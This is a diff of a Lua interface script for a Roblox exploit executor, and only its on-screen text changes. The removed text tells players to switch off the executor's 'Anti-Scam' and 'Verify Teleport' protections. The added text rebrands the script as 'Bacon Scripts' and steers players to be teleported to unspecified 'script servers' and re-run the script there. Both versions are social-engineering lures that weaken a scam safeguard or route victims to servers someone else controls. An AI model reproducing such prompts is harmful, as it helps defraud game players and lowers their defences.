@@ -64,7 +64,7 @@ if executor == "Delta" then
     warningBar.Size = UDim2.new(1, 0, 0.15, 0)
     warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
-    warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
+    warningBar.Text = [[BEST SCRIPT HUB <u>BACON SCRIPTS</u> Tiktok <u>@officialbaconscripts</u>.]]
     warningBar.RichText = true
     warningBar.TextSize = 14
     warningBar.Font = Enum.Font.GothamBold
@@ -96,7 +96,7 @@ if executor == "Delta" then
     local title = Instance.new("TextLabel", bodyHolder)
     title.Size = UDim2.new(1, 0, 0.25, 0)
     title.BackgroundTransparency = 1
-    title.Text = "Delta Anti-Scam Detected"
+    title.Text = "Wait for the script to load and click open the script"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 20
@@ -112,11 +112,11 @@ if executor == "Delta" then
     desc.TextWrapped = true
     desc.TextXAlignment = Enum.TextXAlignment.Center
     desc.TextYAlignment = Enum.TextYAlignment.Center
-    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
-1) Tap the Delta icon at the top.
-2) Open Settings (gear icon).
-3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
-4) Rejoin and run the script again. ]]
+    desc.Text = [[ <font color="#FFD700">Bacon Scripts Hub Instructions</font>.
+1) <font color="#FF0000">DON'T USE</font> random scripts from comments.
+2) Scripts only work on "<font color="#FFD700">public servers</font>", it will direct you to script servers.
+3) Choose "<font color="#FFD700">Click to Open the script</font>" to run the script loader.
+4) Once you are transferred to script servers, re-execute the script and it will run properly. ]]
     desc.RichText = true
 
     -- Button Container
